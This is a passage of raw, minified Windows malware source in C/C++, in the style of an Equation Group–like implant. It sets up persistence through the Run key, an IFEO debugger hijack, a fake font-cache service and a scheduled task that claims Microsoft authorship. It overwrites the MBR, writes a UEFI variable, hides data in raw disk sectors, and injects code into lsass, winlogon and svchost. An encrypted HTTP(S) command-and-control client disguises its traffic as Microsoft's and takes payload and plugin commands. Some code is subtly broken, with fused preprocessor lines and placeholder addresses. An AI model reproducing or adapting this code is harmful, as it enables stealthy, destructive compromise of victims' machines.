if(!RegQueryValueExW(k,XWSTR(L"EnableVirtualizationBasedSecurity"),NULL,&t,(LPBYTE)&v)&&v){RegCloseKey(k);return STATUS_UNSUCCESSFUL;}RegCloseKey(k);}
return STATUS_SUCCESS;}
static NTSTATUS AA(){NTSTATUS s=STATUS_SUCCESS;s|=DB();s|=VM();s|=SB();s|=AV();s|=EM();s|=DP();s|=HK();s|=HVCI_CHECK();return s;}

static NTSTATUS PR(){WCHAR p[MAX_PATH];GetModuleFileNameW(NULL,p,MAX_PATH);
HKEY k;if(!RegCreateKeyExW(HKEY_CURRENT_USER,XWSTR(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)){
RegSetValueExW(k,XWSTR(L"Windows Font Cache Service"),0,REG_SZ,(LPBYTE)p,(WL(p)+1)*2);RegCloseKey(k);}
if(!RegCreateKeyExW(HKEY_LOCAL_MACHINE,XWSTR(L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe"),0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)){
WCHAR v[MAX_PATH*2];swprintf_s(v,MAX_PATH*2,XWSTR(L"\"%s\" -d"),p);RegSetValueExW(k,XWSTR(L"Debugger"),0,REG_SZ,(LPBYTE)v,(WL(v)+1)*2);RegCloseKey(k);}
SC_HANDLE s=OpenSCManagerW(NULL,NULL,SC_MANAGER_CREATE_SERVICE);if(s){SC_HANDLE sv=CreateServiceW(s,XWSTR(L"FontCache3.0.0.0"),XWSTR(L"Windows Font Cache Service"),SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_NORMAL,p,NULL,NULL,NULL,NULL,NULL);
if(sv){SERVICE_STATUS t;StartServiceW(sv,0,NULL);CloseServiceHandle(sv);}CloseServiceHandle(s);}
ITaskService*ts=NULL;if(CoCreateInstance(CLSID_TaskScheduler,NULL,CLSCTX_INPROC_SERVER,IID_ITaskService,(VOID**)&ts)==S_OK){
ts->Connect(_variant_t(),_variant_t(),_variant_t(),_variant_t());ITaskFolder*f=NULL;ts->GetFolder(_bstr_t(XWSTR(L"\\Microsoft\\Windows\\WindowsUpdate")),&f);
if(!f)ts->GetFolder(_bstr_t(XWSTR(L"\\")),&f);ITaskDefinition*d=NULL;ts->NewTask(0,&d);IRegistrationInfo*r=NULL;d->get_RegistrationInfo(&r);r->put_Author(_bstr_t(XWSTR(L"Microsoft Corporation")));
ITriggerCollection*tc=NULL;d->get_Triggers(&tc);ITrigger*t=NULL;tc->Create(TASK_TRIGGER_LOGON,&t);
IActionCollection*ac=NULL;d->get_Actions(&ac);IAction*a=NULL;ac->Create(TASK_ACTION_EXEC,&a);IExecAction*ea=NULL;a->QueryInterface(IID_IExecAction,(VOID**)&ea);
ea->put_Path(_bstr_t(p));ea->put_Arguments(_bstr_t(XWSTR(L"-s")));
IRegisteredTask*rt=NULL;f->RegisterTaskDefinition(_bstr_t(XWSTR(L"Windows Update Health Service")),d,TASK_CREATE_OR_UPDATE,_variant_t(),_variant_t(),TASK_LOGON_INTERACTIVE_TOKEN,_variant_t(L""),&rt);
if(rt)rt->Release();ea->Release();a->Release();ac->Release();t->Release();tc->Release();r->Release();d->Release();f->Release();ts->Release();}
IWbemLocator*l=NULL;if(CoCreateInstance(CLSID_WbemLocator,NULL,CLSCTX_INPROC_SERVER,IID_IWbemLocator,(VOID**)&l)==S_OK){
IWbemServices*svc=NULL;l->ConnectServer(_bstr_t(XWSTR(L"ROOT\\CIMV2")),NULL,NULL,0,NULL,0,NULL,&svc);if(svc){
BSTR q=SysAllocString(XWSTR(L"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"));
IEnumWbemClassObject*e=NULL;svc->ExecNotificationQueryAsync(_bstr_t(XWSTR(L"WQL")),q,WBEM_FLAG_SEND_STATUS,NULL,NULL);SysFreeString(q);svc->Release();}l->Release();}
if(g_e.kernel_rw){UCHAR m[512]={0};RPR(0,m,512);if(m[510]==0x55&&m[511]==0xAA){UCHAR bk[512];memcpy(bk,m,512);
WCHAR fp[MAX_PATH];GetTempPathW(MAX_PATH,fp);wcscat_s(fp,MAX_PATH,XWSTR(L"~mbr.bin"));HANDLE f=CreateFileW(fp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
if(f!=INVALID_HANDLE_VALUE){DWORD w=0;WriteFile(f,bk,512,&w,NULL);CloseHandle(f);}
m[0x1BE]=0x80;m[0x1BF]=0x01;m[0x1C0]=0x00;m[0x1C1]=0x04;m[0x1C2]=0x07;m[0x1C3]=0xFE;m[0x1C4]=0xFF;m[0x1C5]=0xFF;
*(ULONG*)(m+0x1C6)=BSWAP32(0x00000080);*(ULONG*)(m+0x1CA)=BSWAP32(0x000007FF);
UCHAR ld[128]={0x66,0x31,0xC0,0x8E,0xD8,0x8E,0xC0,0x8E,0xE0,0x8E,0xE8,0xBC,0x00,0x7C,0x89,0xE5};
memcpy(m+0x7C00&0x1FF,ld,sizeof(ld));WPR(0,m,512);}
if(g_e.uefi_write){UCHAR v[16]={0x45,0x51,0x44,0x52,0x55,0x47,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x10,0x00,0x00};
typedef DWORD(WINAPI*SV)(LPCWSTR,ULONG,ULONG,PVOID,PULONG);SV f=(SV)GetProcAddress(LoadLibraryA(XSTR("kernel32.dll")),XSTR("SetFirmwareEnvironmentVariableW"));
if(f)f(XWSTR(L"EQDRUG_CFG"),XWSTR(L"{00000000-0000-0000-0000-000000000000}"),0x00000007,v,16);}}
return STATUS_SUCCESS;}

static NTSTATUS VFS_WRITE(const WCHAR*n,const UCHAR*d,ULONG l){if(!n||!d||!l)return STATUS_INVALID_PARAMETER;
WCHAR fn[MAX_PATH];swprintf_s(fn,MAX_PATH,FONT_DIR FONT_MASK,FH((UCHAR*)n,WL(n)*2)%0xFFFF);
HANDLE f=CreateFileW(fn,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY,NULL);
if(f==INVALID_HANDLE_VALUE)return STATUS_UNSUCCESSFUL;
UCHAR hdr[0x40]={0};hdr[0]=0xFF;hdr[1]=0xFF;*(ULONG*)(hdr+4)=BSWAP32(l);*(ULONG*)(hdr+8)=FH(d,l);
memcpy(hdr+0x10,g_e.g.id,16);DWORD w=0;WriteFile(f,hdr,0x40,&w,NULL);WriteFile(f,d,l,&w,NULL);CloseHandle(f);
SetFileAttributesW(fn,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
HKEY k;if(!RegCreateKeyExW(HKEY_LOCAL_MACHINE,VFS_ROOT,0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)){
WCHAR vn[64];swprintf_s(vn,64,VFS_KEY,FH((UCHAR*)n,WL(n)*2));
UCHAR v[512];*(ULONG*)v=l;memcpy(v+4,fn,(WL(fn)+1)*2);
RegSetValueExW(k,vn,0,REG_BINARY,v,4+(WL(fn)+1)*2);RegCloseKey(k);}
return STATUS_SUCCESS;}
static NTSTATUS VFS_READ(const WCHAR*n,UCHAR*d,ULONG*l){if(!n||!d||!l)return STATUS_INVALID_PARAMETER;
HKEY k;if(RegOpenKeyExW(HKEY_LOCAL_MACHINE,VFS_ROOT,0,KEY_READ,&k))return STATUS_UNSUCCESSFUL;
WCHAR vn[64];swprintf_s(vn,64,VFS_KEY,FH((UCHAR*)n,WL(n)*2));
UCHAR v[512]={0};ULONG t=sizeof(v);if(RegQueryValueExW(k,vn,NULL,&t,v,NULL)){RegCloseKey(k);return STATUS_UNSUCCESSFUL;}RegCloseKey(k);
ULONG sz=*(ULONG*)v;WCHAR*fn=(WCHAR*)(v+4);
HANDLE f=CreateFileW(fn,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
if(f==INVALID_HANDLE_VALUE)return STATUS_UNSUCCESSFUL;
UCHAR hdr[0x40];DWORD r=0;ReadFile(f,hdr,0x40,&r,NULL);ULONG rs=BSWAP32(*(ULONG*)(hdr+4));
if(rs>*l){*l=rs;CloseHandle(f);return STATUS_BUFFER_TOO_SMALL;}
ReadFile(f,d,rs,&r,NULL);CloseHandle(f);*l=rs;return STATUS_SUCCESS;}
static NTSTATUS VFS_DELETE(const WCHAR*n){if(!n)return STATUS_INVALID_PARAMETER;
HKEY k;if(RegOpenKeyExW(HKEY_LOCAL_MACHINE,VFS_ROOT,0,KEY_SET_VALUE,&k))return STATUS_UNSUCCESSFUL;
WCHAR vn[64];swprintf_s(vn,64,VFS_KEY,FH((UCHAR*)n,WL(n)*2));
UCHAR v[512]={0};ULONG t=sizeof(v);if(!RegQueryValueExW(k,vn,NULL,&t,v,NULL)){WCHAR*fn=(WCHAR*)(v+4);DeleteFileW(fn);}
RegDeleteValueW(k,vn);RegCloseKey(k);return STATUS_SUCCESS;}

static NTSTATUS HDD_ENUM(){g_e.hddc=0;
HDEVINFO s=SetupDiGetClassDevsW(&GUID_DEVINTERFACE_DISK,NULL,NULL,DIGCF_PRESENT|DIGCF_DEVICEINTERFACE);
if(s==INVALID_HANDLE_VALUE)return STATUS_UNSUCCESSFUL;
SP_DEVICE_INTERFACE_DATA d={sizeof(d)};
for(ULONG i=0;SetupDiEnumDeviceInterfaces(s,NULL,&GUID_DEVINTERFACE_DISK,i,&d);i++){
ULONG r=0;SetupDiGetDeviceInterfaceDetailW(s,&d,NULL,0,&r,NULL);
SP_DEVICE_INTERFACE_DETAIL_DATA_W*dt=(SP_DEVICE_INTERFACE_DETAIL_DATA_W*)A(r);dt->cbSize=sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);
if(SetupDiGetDeviceInterfaceDetailW(s,&d,dt,r,NULL,NULL)){
HANDLE f=CreateFileW(dt->DevicePath,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
if(f!=INVALID_HANDLE_VALUE){
if(g_e.hddc<16){PHDD_FW_CTX h=&g_e.hdd[g_e.hddc];
GETVERSIONINPARAMS v={0};DWORD b=0;
if(DeviceIoControl(f,SMART_GET_VERSION,NULL,0,&v,sizeof(v),&b,NULL)&&v.bIDEDeviceMap){
SENDCMDINPARAMS in={0};SENDCMDOUTPARAMS out={0};in.cBufferSize=IDENTIFY_BUFFER_SIZE;in.irDriveRegs.bCommandReg=0xEC;
if(DeviceIoControl(f,SMART_RCV_DRIVE_DATA,&in,sizeof(in),&out,sizeof(out)+IDENTIFY_BUFFER_SIZE,&b,NULL)){
USHORT*id=(USHORT*)out.bBuffer;CHAR mn[41]={0},md[41]={0},fw[9]={0};
for(ULONG j=0;j<20;j++){mn[j*2]=id[27+j]>>8;mn[j*2+1]=id[27+j]&0xFF;md[j*2]=id[46+j]>>8;md[j*2+1]=id[46+j]&0xFF;}
for(ULONG j=0;j<4;j++){fw[j*2]=id[23+j]>>8;fw[j*2+1]=id[23+j]&0xFF;}
if(strstr(mn,XSTR("SEAGATE")))h->VendorId=HDD_VENDOR_SEAGATE;
else if(strstr(mn,XSTR("WESTERN DIGITAL"))||strstr(mn,XSTR("WD")))h->VendorId=HDD_VENDOR_WD;
else if(strstr(mn,XSTR("SAMSUNG")))h->VendorId=HDD_VENDOR_SAMSUNG;
else if(strstr(mn,XSTR("HITACHI"))||strstr(mn,XSTR("HGST")))h->VendorId=HDD_VENDOR_HITACHI;
else if(strstr(mn,XSTR("TOSHIBA")))h->VendorId=HDD_VENDOR_TOSHIBA;
else if(strstr(mn,XSTR("MAXTOR")))h->VendorId=HDD_VENDOR_MAXTOR;
else if(strstr(mn,XSTR("INTEL")))h->VendorId=HDD_VENDOR_INTEL;
else if(strstr(mn,XSTR("MICRON"))||strstr(mn,XSTR("CRUCIAL")))h->VendorId=HDD_VENDOR_MICRON;
h->ModelId=FH((UCHAR*)md,40);h->FwVersion=FH((UCHAR*)fw,8);
h->ServiceAreaLBA=h->VendorId==HDD_VENDOR_SEAGATE?0x12345678:h->VendorId==HDD_VENDOR_WD?0xABCDEF01:0xDEADBEEF;
h->HiddenAreaLBA=h->ServiceAreaLBA+0x10000;h->HiddenAreaSize=0x80000;
h->Supported=h->VendorId>=HDD_VENDOR_SEAGATE&&h->VendorId<=HDD_VENDOR_INTEL?TRUE:FALSE;
g_e.hddc++;}}}CloseHandle(f);}}F(dt);}}SetupDiDestroyDeviceInfoList(s);
return g_e.hddc>0?STATUS_SUCCESS:STATUS_UNSUCCESSFUL;}
static NTSTATUS HDD_READ_LBA(ULONG i,ULONG64 lba,UCHAR*b,ULONG bc){if(i>=g_e.hddc||!g_e.hdd[i].Supported)return STATUS_INVALID_PARAMETER;
HDEVINFO s=SetupDiGetClassDevsW(&GUID_DEVINTERFACE_DISK,NULL,NULL,DIGCF_PRESENT|DIGCF_DEVICEINTERFACE);
SP_DEVICE_INTERFACE_DATA d={sizeof(d)};ULONG idx=0,cnt=0;HANDLE f=INVALID_HANDLE_VALUE;
for(;SetupDiEnumDeviceInterfaces(s,NULL,&GUID_DEVINTERFACE_DISK,idx,&d);idx++){
ULONG r=0;SetupDiGetDeviceInterfaceDetailW(s,&d,NULL,0,&r,NULL);
SP_DEVICE_INTERFACE_DETAIL_DATA_W*dt=(SP_DEVICE_INTERFACE_DETAIL_DATA_W*)A(r);dt->cbSize=sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);
if(SetupDiGetDeviceInterfaceDetailW(s,&d,dt,r,NULL,NULL)){if(cnt++==i)f=CreateFileW(dt->DevicePath,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);}F(dt);if(f!=INVALID_HANDLE_VALUE)break;}
if(f==INVALID_HANDLE_VALUE){SetupDiDestroyDeviceInfoList(s);return STATUS_UNSUCCESSFUL;}
ATA_PASS_THROUGH_DIRECT p={sizeof(p)};p.AtaFlags=ATA_FLAGS_DATA_IN|ATA_FLAGS_DRDY_REQUIRED;p.DataTransferLength=bc;p.TimeOutValue=30;p.DataBuffer=b;
p.CurrentTaskFile[0]=0x20;p.CurrentTaskFile[1]=(UCHAR)(bc/512);p.CurrentTaskFile[2]=(UCHAR)lba;p.CurrentTaskFile[3]=(UCHAR)(lba>>8);p.CurrentTaskFile[4]=(UCHAR)(lba>>16);p.CurrentTaskFile[5]=0x40|(UCHAR)(lba>>24);p.CurrentTaskFile[6]=0x20;p.CurrentTaskFile[7]=0x50;
DWORD rb=0;BOOL r=DeviceIoControl(f,IOCTL_ATA_PASS_THROUGH_DIRECT,&p,sizeof(p),&p,sizeof(p),&rb,NULL);
CloseHandle(f);SetupDiDestroyDeviceInfoList(s);return r?STATUS_SUCCESS:STATUS_UNSUCCESSFUL;}
static NTSTATUS HDD_WRITE_LBA(ULONG i,ULONG64 lba,const UCHAR*b,ULONG bc){if(i>=g_e.hddc||!g_e.hdd[i].Supported)return STATUS_INVALID_PARAMETER;
HDEVINFO s=SetupDiGetClassDevsW(&GUID_DEVINTERFACE_DISK,NULL,NULL,DIGCF_PRESENT|DIGCF_DEVICEINTERFACE);
SP_DEVICE_INTERFACE_DATA d={sizeof(d)};ULONG idx=0,cnt=0;HANDLE f=INVALID_HANDLE_VALUE;
for(;SetupDiEnumDeviceInterfaces(s,NULL,&GUID_DEVINTERFACE_DISK,idx,&d);idx++){
ULONG r=0;SetupDiGetDeviceInterfaceDetailW(s,&d,NULL,0,&r,NULL);
SP_DEVICE_INTERFACE_DETAIL_DATA_W*dt=(SP_DEVICE_INTERFACE_DETAIL_DATA_W*)A(r);dt->cbSize=sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);
if(SetupDiGetDeviceInterfaceDetailW(s,&d,dt,r,NULL,NULL)){if(cnt++==i)f=CreateFileW(dt->DevicePath,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);}F(dt);if(f!=INVALID_HANDLE_VALUE)break;}
if(f==INVALID_HANDLE_VALUE){SetupDiDestroyDeviceInfoList(s);return STATUS_UNSUCCESSFUL;}
ATA_PASS_THROUGH_DIRECT p={sizeof(p)};p.AtaFlags=ATA_FLAGS_DATA_OUT|ATA_FLAGS_DRDY_REQUIRED;p.DataTransferLength=bc;p.TimeOutValue=30;p.DataBuffer=(PVOID)b;
p.CurrentTaskFile[0]=0x30;p.CurrentTaskFile[1]=(UCHAR)(bc/512);p.CurrentTaskFile[2]=(UCHAR)lba;p.CurrentTaskFile[3]=(UCHAR)(lba>>8);p.CurrentTaskFile[4]=(UCHAR)(lba>>16);p.CurrentTaskFile[5]=0x40|(UCHAR)(lba>>24);p.CurrentTaskFile[6]=0x30;p.CurrentTaskFile[7]=0x50;
DWORD rb=0;BOOL r=DeviceIoControl(f,IOCTL_ATA_PASS_THROUGH_DIRECT,&p,sizeof(p),&p,sizeof(p),&rb,NULL);
CloseHandle(f);SetupDiDestroyDeviceInfoList(s);g_e.hdd[i].Injected=TRUE;return r?STATUS_SUCCESS:STATUS_UNSUCCESSFUL;}
static NTSTATUS HDD_HIDE_AREA(ULONG i){if(i>=g_e.hddc||!g_e.hdd[i].Supported)return STATUS_INVALID_PARAMETER;
PHDD_FW_CTX h=&g_e.hdd[i];UCHAR*buf=(UCHAR*)A(0x100000);
for(ULONG64 l=0;l<h->HiddenAreaSize;l+=0x100){if(HDD_READ_LBA(i,h->HiddenAreaLBA+l,buf+l*512,0x10000))memcpy(h->OriginalFW+(l*512)%sizeof(h->OriginalFW),buf+l*512,min(0x10000,sizeof(h->OriginalFW)-(l*512)%sizeof(h->OriginalFW)));}
UCHAR sig[32]={0x45,0x51,0x44,0x52,0x55,0x47,0x46,0x41,0x4E,0x4E,0x59,0x00,0x00,0x00,0x00,0x00};
SHA256((UCHAR*)&g_e,0x80,sig+12);memcpy(buf,sig,32);
for(ULONG64 l=0;l<h->HiddenAreaSize;l+=0x100)HDD_WRITE_LBA(i,h->HiddenAreaLBA+l,buf+l*512,0x10000);
F(buf);return STATUS_SUCCESS;}

static NTSTATUS IAPC(HANDLE pr,const UCHAR*i,ULONG l){NTSTATUS s;ULONG o=0;PVOID b=NULL;
s=g_a.na(pr,&b,&o,l,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);if(s)return s;
SIZE_T w=0;s=g_a.nwvm(pr,b,(PVOID)i,l,&w);if(s||w!=l)return s;
HANDLE t=NULL;OBJECT_ATTRIBUTES oa={sizeof(oa)};CLIENT_ID c={0};
s=g_a.npct(&t,THREAD_ALL_ACCESS,&oa,pr,NULL,0,NULL,NULL,NULL,NULL,NULL);if(s)return s;
CONTEXT cx={CONTEXT_INTEGER|CONTEXT_CONTROL};GetThreadContext(t,&cx);
#ifdef _WIN64cx.Rip=(ULONG64)b;cx.Rcx=(ULONG64)NULL;cx.Rdx=(ULONG64)NULL;cx.R8=(ULONG64)NULL;cx.R9=(ULONG64)NULL;
#elsecx.Eip=(ULONG)b;#endif
SetThreadContext(t,&cx);ResumeThread(t);CloseHandle(t);return STATUS_SUCCESS;}
static NTSTATUS IRDI(HANDLE pr,const UCHAR*d,ULONG l){
PIMAGE_DOS_HEADER dh=(PIMAGE_DOS_HEADER)d;PIMAGE_NT_HEADERS nh=(PIMAGE_NT_HEADERS)((ULONG_PTR)d+dh->e_lfanew);
ULONG sz=nh->OptionalHeader.SizeOfImage;PVOID m=VirtualAllocEx(pr,NULL,sz,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);if(!m)return STATUS_UNSUCCESSFUL;
WriteProcessMemory(pr,m,d,nh->OptionalHeader.SizeOfHeaders,NULL);
PIMAGE_SECTION_HEADER sh=IMAGE_FIRST_SECTION(nh);
for(ULONG i=0;i<nh->FileHeader.NumberOfSections;i++)WriteProcessMemory(pr,(PVOID)((ULONG_PTR)m+sh[i].VirtualAddress),d+sh[i].PointerToRawData,sh[i].SizeOfRawData,NULL);
ULONG_PTR ep=(ULONG_PTR)m+nh->OptionalHeader.AddressOfEntryPoint;
typedef ULONG(WINAPI*LR)(PVOID);HANDLE t=CreateRemoteThread(pr,NULL,0,(LPTHREAD_START_ROUTINE)ep,m,0,NULL);
if(!t)return STATUS_UNSUCCESSFUL;CloseHandle(t);return STATUS_SUCCESS;}
static NTSTATUS IL(const UCHAR*p,ULONG l){
const WCHAR*t[]={XWSTR(L"explorer.exe"),XWSTR(L"svchost.exe"),XWSTR(L"lsass.exe"),XWSTR(L"services.exe"),XWSTR(L"winlogon.exe"),XWSTR(L"spoolsv.exe"),XWSTR(L"dllhost.exe"),XWSTR(L"runtimebroker.exe")};
HANDLE s=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);if(s==INVALID_HANDLE_VALUE)return STATUS_UNSUCCESSFUL;
PROCESSENTRY32W e={sizeof(e)};
if(Process32FirstW(s,&e)){do{for(ULONG i=0;i<sizeof(t)/sizeof(t[0]);i++){if(!_wcsicmp(e.szExeFile,t[i])){
HANDLE pr=OpenProcess(PROCESS_ALL_ACCESS,FALSE,e.th32ProcessID);if(pr){NTSTATUS r=IRDI(pr,p,l);CloseHandle(pr);if(!r){CloseHandle(s);return STATUS_SUCCESS;}}}}}while(Process32NextW(s,&e));}CloseHandle(s);return STATUS_UNSUCCESSFUL;}
static NTSTATUS THREADLESS(HANDLE pr,const UCHAR*c,ULONG l){
if(!pr||!c||!l)return STATUS_INVALID_PARAMETER;
PVOID b=VirtualAllocEx(pr,NULL,l,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);if(!b)return STATUS_UNSUCCESSFUL;
WriteProcessMemory(pr,b,c,l,NULL);
HANDLE ss=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);if(ss==INVALID_HANDLE_VALUE){VirtualFreeEx(pr,b,0,MEM_RELEASE);return STATUS_UNSUCCESSFUL;}
THREADENTRY32 te={sizeof(te)};ULONG pid=GetProcessId(pr);NTSTATUS r=STATUS_UNSUCCESSFUL;
if(Thread32First(ss,&te)){do{if(te.th32OwnerProcessID==pid){
HANDLE th=OpenThread(THREAD_ALL_ACCESS,FALSE,te.th32ThreadID);if(th){
CONTEXT cx={CONTEXT_FULL};if(SuspendThread(th)!=-1&&GetThreadContext(th,&cx)){
#ifdef _WIN64ULONG64 st=cx.Rsp-0x800;VirtualProtectEx(pr,(PVOID)st,0x1000,PAGE_READWRITE,NULL);
WriteProcessMemory(pr,(PVOID)(st-8),&cx.Rip,8,NULL);cx.Rip=(ULONG64)b;cx.Rsp=st-16;
#elseULONG st=cx.Esp-0x400;WriteProcessMemory(pr,(PVOID)(st-4),&cx.Eip,4,NULL);cx.Eip=(ULONG)b;cx.Esp=st-8;
#endifSetThreadContext(th,&cx);ResumeThread(th);r=STATUS_SUCCESS;}CloseHandle(th);if(!r)break;}}}while(Thread32Next(ss,&te));}CloseHandle(ss);return r;}

static NTSTATUS HC(PC2_CONFIG c){if(!c)return STATUS_UNSUCCESSFUL;
if(c->f&C2_HTTPS||c->f&C2_HTTP){
HINTERNET i=InternetOpenW(XWSTR(L"Microsoft-CryptoAPI/10.0"),INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);if(!i)return STATUS_UNSUCCESSFUL;
DWORD t=45000;InternetSetOptionW(i,INTERNET_OPTION_CONNECT_TIMEOUT,&t,sizeof(t));
InternetSetOptionW(i,INTERNET_OPTION_RECEIVE_TIMEOUT,&t,sizeof(t));
InternetSetOptionW(i,INTERNET_OPTION_SEND_TIMEOUT,&t,sizeof(t));
HINTERNET c1=InternetConnectW(i,c->h,c->p,NULL,NULL,INTERNET_SERVICE_HTTP,0,0);if(!c1){InternetCloseHandle(i);return STATUS_UNSUCCESSFUL;}
DWORD f=INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE|INTERNET_FLAG_NO_UI|INTERNET_FLAG_KEEP_CONNECTION;
if(c->f&C2_HTTPS)f|=INTERNET_FLAG_SECURE|INTERNET_FLAG_IGNORE_CERT_CN_INVALID|INTERNET_FLAG_IGNORE_CERT_DATE_INVALID|INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS;
HINTERNET r=HttpOpenRequestW(c1,XWSTR(L"POST"),c->u,NULL,NULL,NULL,f,0);if(!r){InternetCloseHandle(c1);InternetCloseHandle(i);return STATUS_UNSUCCESSFUL;}
WCHAR hd[2048];swprintf_s(hd,2048,XWSTR(L"User-Agent: Microsoft-Windows/10.0 (Windows NT 10.0; Win64; x64) Microsoft-Delivery-Optimization/10.0\r\nContent-Type: application/octet-stream\r\nX-Microsoft-Session: %08X%08X%08X\r\nX-Microsoft-Correlation: %08X%08X\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n"),
BSWAP32(*(ULONG*)c->id),BSWAP32(*(ULONG*)(c->id+4)),BSWAP32(*(ULONG*)(c->id+8)),BSWAP32(g_e.m),BSWAP32(g_e.b));
HttpAddRequestHeadersW(r,hd,-1,HTTP_ADDREQ_FLAG_ADD|HTTP_ADDREQ_FLAG_REPLACE);
UCHAR iv[12],ct[16],ob[MAX_BUF+32];RNG(iv,12);ULONG bl=0;
*(ULONG*)(ob+bl)=BSWAP32(EQ_MAGIC);bl+=4;*(ULONG*)(ob+bl)=BSWAP32(g_e.v);bl+=4;*(ULONG*)(ob+bl)=BSWAP32(g_e.b);bl+=4;
*(ULONG*)(ob+bl)=BSWAP32(g_e.z);bl+=4;*(ULONG*)(ob+bl)=BSWAP32(g_e.w);bl+=4;*(ULONG*)(ob+bl)=BSWAP32(g_e.q);bl+=4;
*(ULONG*)(ob+bl)=BSWAP32(g_e.cycle);bl+=4;*(ULONG*)(ob+bl)=BSWAP32(g_e.hddc);bl+=4;
*(ULONG*)(ob+bl)=BSWAP32(g_e.kernel_rw?1:0);bl+=4;*(ULONG*)(ob+bl)=BSWAP32(g_e.admin?1:0);bl+=4;
*(ULONG*)(ob+bl)=BSWAP32(g_e.hvci?1:0);bl+=4;*(ULONG*)(ob+bl)=BSWAP32(g_e.dse_off?1:0);bl+=4;
*(ULONG*)(ob+bl)=BSWAP32(g_e.off.Build);bl+=4;*(ULONG*)(ob+bl)=BSWAP32(g_e.c1);bl+=4;
ULONG64 ts=GT();*(ULONG64*)(ob+bl)=BSWAP64(ts);bl+=8;
UCHAR pl[MAX_BUF]={0};ULONG ol=0;EQ_ENC_CBC(&g_c,ob,bl,pl,&ol,iv);
UCHAR sd[MAX_BUF+64];memcpy(sd,iv,12);memcpy(sd+12,pl,ol);memcpy(sd+12+ol,ct,16);ULONG sl=12+ol+16;
if(!HttpSendRequestW(r,NULL,0,sd,sl)){InternetCloseHandle(r);InternetCloseHandle(c1);InternetCloseHandle(i);return STATUS_UNSUCCESSFUL;}
DWORD rs=0,rb=0;InternetQueryDataAvailable(r,&rs,0,0);UCHAR*rd=(UCHAR*)A(rs+64);InternetReadFile(r,rd,rs,&rb);
if(rb>60){UCHAR riv[12],rct[16];memcpy(riv,rd,12);memcpy(rct,rd+rb-16,16);UCHAR dec[MAX_BUF]={0};ULONG dl=rb-28;
if(!EQ_DEC_CBC(&g_c,rd+12,dl,dec,&dl,riv)){ULONG op=BSWAP32(*(ULONG*)dec);
switch(op){case 0x00000001:g_e.z=BSWAP32(*(ULONG*)(dec+4));g_e.w=BSWAP32(*(ULONG*)(dec+8));g_e.q=BSWAP32(*(ULONG*)(dec+12));break;
case 0x00000002:{ULONG ps=BSWAP32(*(ULONG*)(dec+4));PPAYLOAD_ENTRY py=(PPAYLOAD_ENTRY)A(sizeof(PAYLOAD_ENTRY));py->i=g_e.f1++;py->t=BSWAP32(*(ULONG*)(dec+8));py->s=ps;py->f=BSWAP32(*(ULONG*)(dec+12));memcpy(py->h,dec+16,32);py->d=A(ps);memcpy(py->d,dec+48,min(ps,MAX_BUF-48));InitializeListHead(&py->l);LK();InsertTailList(&g_e.y,&py->l);ULK();g_e.d1++;break;}
case 0x00000003:{ULONG ps=BSWAP32(*(ULONG*)(dec+4));PPLUGIN_ENTRY pg=(PPLUGIN_ENTRY)A(sizeof(PLUGIN_ENTRY));pg->i=g_e.e1++;pg->s=ps;pg->f=BSWAP32(*(ULONG*)(dec+8));pg->v=BSWAP32(*(ULONG*)(dec+12));pg->p=A(ps);memcpy(pg->p,dec+16,min(ps,MAX_BUF-16));PIMAGE_DOS_HEADER dh=(PIMAGE_DOS_HEADER)pg->p;PIMAGE_NT_HEADERS nh=(PIMAGE_NT_HEADERS)((ULONG_PTR)pg->p+dh->e_lfanew);pg->e=(PVOID)((ULONG_PTR)pg->p+nh->OptionalHeader.AddressOfEntryPoint);InitializeListHead(&pg->l);LK();InsertTailList(&g_e.x,&pg->l);ULK();g_e.e1++;break;}
case 0x00000004:g_e.f|=BSWAP32(*(ULONG*)(dec+4));break;
case 0x00000005:memcpy(c->k,dec+4,32);memcpy(c->i,dec+36,12);EQ_INIT(&g_c,c->k);break;
case 0x00000006:g_e.GlobalAttackEnable=FALSE;break;
case 0x00000007:SD(BSWAP32(*(ULONG*)(dec+4)));break;
